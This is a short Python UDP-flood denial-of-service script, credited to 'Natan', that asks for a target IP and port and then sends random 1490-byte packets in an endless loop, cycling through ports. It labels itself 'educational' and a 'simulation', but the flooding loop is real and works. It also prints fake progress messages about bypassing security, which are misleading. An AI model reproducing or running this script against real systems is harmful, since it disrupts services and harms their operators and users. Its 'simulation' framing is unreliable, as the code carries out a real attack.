import socket
import random
import time
import os
from datetime import datetime

# Limpeza de tela e título (opcional)
os.system("clear" if os.name == "posix" else "cls")
os.system("figlet Natan-DDOS" if os.name == "posix" else "")

print("Coded By : Natan")
print("Author   : Natan")
print("Github   : github.com/natanfagundes")
print("Note: This is for educational purposes only. Use responsibly.\n")

ip = input("IP Target : ")
port = int(input("Port      : "))

# Preparando o socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)

# Mensagens de simulação
os.system("clear" if os.name == "posix" else "cls")
os.system("figlet GMKR-Ddos" if os.name == "posix" else "")
print("\033[92m")
print("________________TRYING TO REACH THE SERVER_____________________")
time.sleep(2)
print("_________________ESTABLISHING CONNECTION_______________________")
time.sleep(2)
print("_________0100100 BYPASSING SECURITY LAYER 001010_______________")
time.sleep(2)
print("_________________CONNECTION ESTABLISHED________________________")
time.sleep(2)
print("    DDOS ATTACK SIMULATION STARTED. NOTE: FOR EDUCATIONAL PURPOSES")
time.sleep(2)

# Loop de envio (educacional)
sent = 0
while True:
    try:
        sock.sendto(bytes_data, (ip, port))
        sent += 1
        port += 1
        if port > 65535:
            port = 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting.")
        break
    except Exception as e:
        print(f"[!] Error: {e}")
        break
